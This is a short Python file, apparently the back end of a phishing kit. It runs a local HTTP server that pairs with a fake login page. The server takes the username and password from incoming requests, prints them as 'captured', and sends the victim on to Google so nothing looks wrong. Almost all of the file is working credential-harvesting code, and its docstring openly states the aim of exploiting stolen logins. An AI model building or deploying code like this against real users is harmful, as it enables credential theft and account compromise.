from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

hostname = "localhost"
server_port = 8888


class Server(BaseHTTPRequestHandler):
    """
    The index.html page resembles a standard login page, however it works in tandem with this server class to extract, store & exploit a username & password. 
    """
    def do_GET(self):
        queries = parse_qs(urlparse(self.path).query)
        username = queries["username"][0]
        password = queries["password"][0]
        print("captured username: %s"%username)
        print("captured password: %s"%password)
        self.send_response(200)
        self.send_header("location", "https://www.google.com")
        self.end_headers()

if __name__ == "__main__":
    web_server = HTTPServer((hostname, server_port), Server)
    print (f"server started at {hostname}:{server_port}")

    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        pass

    web_server.server_close()
    print ("server stopped")